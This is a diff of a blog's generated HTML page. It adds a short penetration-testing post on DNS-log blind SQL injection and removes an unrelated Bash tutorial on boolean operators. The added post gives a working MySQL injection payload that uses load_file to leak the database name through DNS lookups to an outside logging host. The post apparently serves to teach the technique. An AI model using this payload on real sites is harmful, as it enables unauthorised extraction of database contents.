@@ -158,6 +158,101 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2016/11/18/SQLInjectionDnsLog/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Dong Cong">
+      <meta itemprop="description" content="bW9ua2V5Y2RAZ21haWwuY29t">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="congdong007">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2016/11/18/SQLInjectionDnsLog/" class="post-title-link" itemprop="url">DNS Log Blind SQL Injection</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2016-11-18 10:47:59" itemprop="dateCreated datePublished" datetime="2016-11-18T10:47:59-05:00">2016-11-18</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-10-19 10:53:51" itemprop="dateModified" datetime="2023-10-19T10:53:51-04:00">2023-10-19</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Penetration-Test/" itemprop="url" rel="index"><span itemprop="name">Penetration Test</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Penetration-Test/MySQL/" itemprop="url" rel="index"><span itemprop="name">MySQL</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Penetration-Test/MySQL/SQL-Injection/" itemprop="url" rel="index"><span itemprop="name">SQL Injection</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Penetration-Test/MySQL/SQL-Injection/DNS-Log-Blind-SQL-Injection/" itemprop="url" rel="index"><span itemprop="name">DNS Log Blind SQL Injection</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>Sometimes, when injecting, you may not get direct feedback, or you may not be able to use time-based blind injection. In such cases, you can use out-of-band channels, which means using other protocols or channels, such as HTTP requests, DNS resolution, SMB services, to exfiltrate data. <strong><em>DNS log</em></strong> blind injection can reduce the number of requests sent and achieve injection with direct feedback.</p>
+<p><strong><em>DNS log</em></strong>: It stores domain name information on the DNS server, recording user access information for domains like <a target="_blank" rel="noopener" href="http://www.xxx.com/">www.xxx.com</a>.</p>
+<p><strong><em>Conditions for utilization</em></strong>:</p>
+<ol>
+<li><code>secure_file_priv</code> in mysql.ini must be empty.</li>
+<li>If <code>secure_file_priv</code> is null, importing and exporting are not allowed.</li>
+<li>If <code>secure_file_priv</code> is set to &#x2F;tmp, importing and exporting can only be done in the &#x2F;tmp directory.</li>
+<li>When <code>secure_file_priv</code> is empty, there are no restrictions, and importing and exporting are allowed.</li>
+</ol>
+<p><strong><em>Example</em></strong>:</p>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and load_file(concat(&#x27;\\&#x27;, (select database()), &#x27;.27epx0.ceye.io\abc&#x27;))--+&quot;</span><br></pre></td></tr></table></figure>
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://example.com/2016/10/28/SQLInjectionTimeBasedBlind/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1001,97 +1096,6 @@ These steps describe how an attacker can detect and exploit a SQL injection vuln
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2012/03/19/BashScript06-BooleanLogicalOperations/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Dong Cong">
-      <meta itemprop="description" content="bW9ua2V5Y2RAZ21haWwuY29t">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="congdong007">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2012/03/19/BashScript06-BooleanLogicalOperations/" class="post-title-link" itemprop="url">Bash Scripting 06 - Boolean Logical Operations</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2012-03-19 23:11:03" itemprop="dateCreated datePublished" datetime="2012-03-19T23:11:03-04:00">2012-03-19</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-10-23 21:53:28" itemprop="dateModified" datetime="2023-10-23T21:53:28-04:00">2023-10-23</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Bash/" itemprop="url" rel="index"><span itemprop="name">Bash</span></a>
-                </span>
-                  , 
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Bash/Bash-Scripting-06-Boolean-Logical-Operations/" itemprop="url" rel="index"><span itemprop="name">Bash Scripting 06 - Boolean Logical Operations</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>Boolean logical operators, like <strong><em>AND</em></strong> (&amp;&amp;) and <strong><em>OR</em></strong> (||) are somewhat mysterious because Bash<br>uses them in a variety of ways.<br>One common use is in command lists, which are chains of commands whose flow is controlled by<br>operators. The “|” (pipe) symbol is a commonly-used operator in a command list and passes the<br>output of one command to the input of another. Similarly, boolean logical operators execute<br>commands based on whether a previous command succeeded (or returned True or 0) or failed<br>(returned False or non-zero).<br>Let’s take a look at the <strong><em>AND</em></strong> (&amp;&amp;) boolean operator first, which executes a command only if the<br>previous command succeeds (or returns True or 0):</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ user2=kali</span><br><span class="line">kali@kali:~$ grep <span class="variable">$user2</span> /etc/passwd &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$user2</span> found!&quot;</span></span><br><span class="line">kali:x:1000:1000:,,,:/home/kali:/bin/bash</span><br><span class="line">kali found!</span><br><span class="line">kali@kali:~$ user2=bob</span><br><span class="line">kali@kali:~$ grep <span class="variable">$user2</span> /etc/passwd &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$user2</span> found!&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>In this example, we first assigned the username we are searching for to the user2 variable. Next,<br>we use the <code>grep</code> command to check if a certain user is listed in the <code>/etc/passwd</code> file, and if it is,<br><code>grep</code> returns True and the <code>echo</code> command is executed. However, when we try searching for a user<br>that we know does not exist in the <code>/etc/passwd</code> file, our <code>echo</code> command is not executed.</p>
-<p>When used in a command list, the <strong><em>OR (||) operator is the opposite of <strong><em>AND (&amp;&amp;); it executes the next<br>command only if the previous command failed (returned False or non-zero):</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ <span class="built_in">echo</span> <span class="variable">$user2</span></span><br><span class="line">bob</span><br><span class="line">kali@kali:~$ grep <span class="variable">$user2</span> /etc/passwd &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$user2</span> found!&quot;</span> || <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$user2</span> not found</span></span><br><span class="line"><span class="string">!&quot;</span></span><br><span class="line">bob not found!</span><br></pre></td></tr></table></figure>
-
-<p>In the above example, we took our previous command a step further and added the <strong><em>OR</em></strong> (||) operator<br>followed by a second <code>echo</code> command. Now, when <code>grep</code> does not find a matching line and returns<br>False, the second <code>echo</code> command after the <strong><em>OR</em></strong> (||) operator is executed instead.<br>These operators can also be used in a test to compare variables or the results of other tests. When<br>used this way, <strong><em>AND</em></strong> (&amp;&amp;) combines two simple conditions, and if they are both true, the combined<br>result is success (or True or 0).<br>Consider this example:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ <span class="built_in">cat</span> ./and.sh</span><br><span class="line"><span class="comment">#/bin/bash</span></span><br><span class="line"><span class="comment"># and example</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$USER</span> == <span class="string">&#x27;kali&#x27;</span> ] &amp;&amp; [ <span class="variable">$HOSTNAME</span> == <span class="string">&#x27;kali&#x27;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Multiple statements are true!&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Not much to see here...&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">kali@kali:~$ <span class="built_in">chmod</span> +x ./and.sh</span><br><span class="line">kali@kali:~$ ./and.sh</span><br><span class="line">Multiple statements are <span class="literal">true</span>!</span><br><span class="line">kali@kali:~$ <span class="built_in">echo</span> <span class="variable">$USER</span> &amp;&amp; <span class="built_in">echo</span> <span class="variable">$HOSTNAME</span></span><br><span class="line">kali</span><br><span class="line">kali</span><br></pre></td></tr></table></figure>
-
-<p>In this example, we used <strong><em>AND</em></strong> (&amp;&amp;) to test multiple conditions and since both variable comparisons<br>were true, the whole if line succeeded, so the then branch executed.<br>When used in a test, the <strong><em>OR</em></strong> (||) boolean operator is used to test one or more conditions, but only<br>one of them has to be true to count as success.<br>Let’s take a look at an example:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ <span class="built_in">cat</span> ./or.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="comment"># or example</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$USER</span> == <span class="string">&#x27;kali&#x27;</span> ] || [ <span class="variable">$HOSTNAME</span> == <span class="string">&#x27;pwn&#x27;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;One condition is true, this line is printed&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;You are out of luck!&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">kali@kali:~$ <span class="built_in">chmod</span> +x ./or.sh</span><br><span class="line">kali@kali:~$ ./or.sh</span><br><span class="line">One condition is <span class="literal">true</span>, this line is printed</span><br><span class="line">kali@kali:~$ <span class="built_in">echo</span> <span class="variable">$USER</span> &amp;&amp; <span class="built_in">echo</span> <span class="variable">$HOSTNAME</span></span><br><span class="line">kali</span><br><span class="line">kali</span><br></pre></td></tr></table></figure>
-
-<p>In this example, we used <strong><em>OR</em></strong> (||) to test multiple conditions and since one of the variable<br>comparisons was true, the whole if line succeeded, so the then branch executed.</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1163,19 +1167,19 @@ These steps describe how an attacker can detect and exploit a SQL injection vuln
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">47</span>
+          <span class="site-state-item-count">48</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
-        <span class="site-state-item-count">66</span>
+        <span class="site-state-item-count">68</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">23</span>
+        <span class="site-state-item-count">26</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
